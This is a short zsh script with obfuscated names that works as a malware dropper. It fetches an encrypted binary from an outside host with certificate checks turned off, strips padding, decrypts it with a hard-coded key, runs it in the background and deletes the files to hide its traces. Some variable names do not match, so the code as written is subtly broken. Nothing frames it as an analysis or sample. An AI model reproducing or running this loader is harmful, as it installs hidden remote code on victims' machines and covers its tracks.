#!/bin/zsh
dcdpb=$(mktemp /tmp/88nmnz.XXXXXX)
curl -kfsSL "https://daisoftwarelimited.com/fd8a70f7f5c848a7ab6f2fea13d547ca/m6d40ed4fbbc3817a.bin" -o "$dcdpbz" || exit 1
qxtrqv=$(stat -f %z "$dcdpbz"); nc233ez=$(( qxtrqv - 2315 - 1027 ))
tail -c +$(( 2315 + 1 )) "$dcdpbz" | head -c $nc233ez | openssl enc -d -aes-256-cbc -k b7c9a8bd227964cc40061354 -out "$dcdpb" 2>/dev/null
[ -s "$dcdpb" ] && chmod 700 "$dcdpb" && ( "$dcdpb" & ) && disown
( sleep 3; rm -f "$dcdpb" "$dcdpbz" ) &>/dev/null &
